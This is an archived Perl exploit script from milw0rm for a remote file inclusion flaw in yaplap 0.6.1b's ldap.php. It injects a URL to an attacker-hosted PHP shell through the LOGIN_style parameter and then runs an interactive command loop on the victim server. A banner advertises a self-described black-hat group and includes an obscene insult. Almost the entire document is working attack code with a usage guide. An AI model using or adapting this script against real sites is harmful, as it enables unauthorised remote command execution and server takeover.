<html><head><title>yaplap <= 0.6.1b (ldap.php) Remote File Include Exploit</title></head><pre>#!/usr/bin/perl
#yaplap Remote File Inclusion Vulnerablity
#Version 0.6 &amp; 0.6.1
#Class = Remote File Inclusion
#Bug Found &amp; Exploit [c]oded By  DeltahackingTEAM      (Dr.Trojan&amp;Dr.Pantagon)
#Download:http://osdn.dl.sourceforge.net/sourceforge/yaplap/yaplap-0.6.1.tar.gz
#Vulnerable Code:include $LOGIN_style.&quot;_form.php&quot;;
#[Path]/Index.php?site_main_path=
#Exploit: ldap.php?LOGIN_style=[shell]
# FUCK Your Mother &amp;Your SisTer=&gt;&gt;&gt; z_zer0c00l
use LWP::UserAgent;

$target=@ARGV[0];
$shellsite=@ARGV[1];
$cmdv=@ARGV[2];

if($target!~/http:\/\// || $shellsite!~/http:\/\// || !$cmdv)
{
       usg()
}
header();


while()
{
print &quot;[Shell] \$&quot;;
while (&lt;STDIN&gt;)
{
       $cmd=$_;
       chomp($cmd);

$xpl = LWP::UserAgent-&gt;new() or die;
$req = HTTP::Request-&gt;new(GET=&gt;$target.'ldap.php?LOGIN_style='.$shellsite='.?&amp;'.$cmdv.'='.$cmd)or die &quot;\n\n Failed to Connect, Try again!\n&quot;;
$res = $xpl-&gt;request($req);
$info = $res-&gt;content;
$info =~ tr/[\n]/[&amp;#234;]/;


if (!$cmd) {
print &quot;\nEnter a Command\n\n&quot;; $info =&quot;&quot;;
}


elsif ($info =~/failed to open stream: HTTP request failed!/ || $info =~/:
Cannot execute a blank command in &lt;b&gt;/)
{
print &quot;\nCould Not Connect to cmd Host or Invalid Command Variable\n&quot;;
exit;
}


elsif ($info =~/^&lt;br.\/&gt;.&lt;b&gt;Warning/) {
print &quot;\nInvalid Command\n\n&quot;;
};


if($info =~ /(.+)&lt;br.\/&gt;.&lt;b&gt;Warning.(.+)&lt;br.\/&gt;.&lt;b&gt;Warning/)
{
$final = $1;
$final=~ tr/[&amp;#234;]/[\n]/;
print &quot;\n$final\n&quot;;
last;
}

else {
print &quot;[shell] \$&quot;;
}
}
}
last;



sub header()
{
print q{
*******************************************************************************
         ***(#$#$#$#$#$=&gt;http://www.deltasecurity.ir&lt;=#$#$#$#$#$)***

Vulnerablity found By: DeltahackingTEAM

Exploit [c]oded By: Dr.Trojan

Dr.Trojan,HIV++,D_7j,Lord,VPc,Tanha,Dr.Pantagon

http://advistory.deltasecurity.ir

We Server(99/999% Secure) &lt;&lt;&lt;&lt;&lt;www.takserver.ir&gt;&gt;&gt;&gt;&gt;

Email:Dr.Trojan[A]deltasecurity.ir 0nly Black Hat
******************************************************************************
}
}
sub usg()
{
header();
print q{
Usage: perl delta.pl [tucows fullpath] [Shell Location] [Shell Cmd]
[yaplap FULL PATH] - Path to site exp. www.site.com
[shell Location] - Path to shell exp. d4wood.by.ru/cmd.gif
[shell Cmd Variable] - Command variable for php shell
Example: perl delta.pl http://www.site.com/[yaplap]/
********************************************************************************
};

exit();
}

# milw0rm.com [2006-12-14]</pre></html>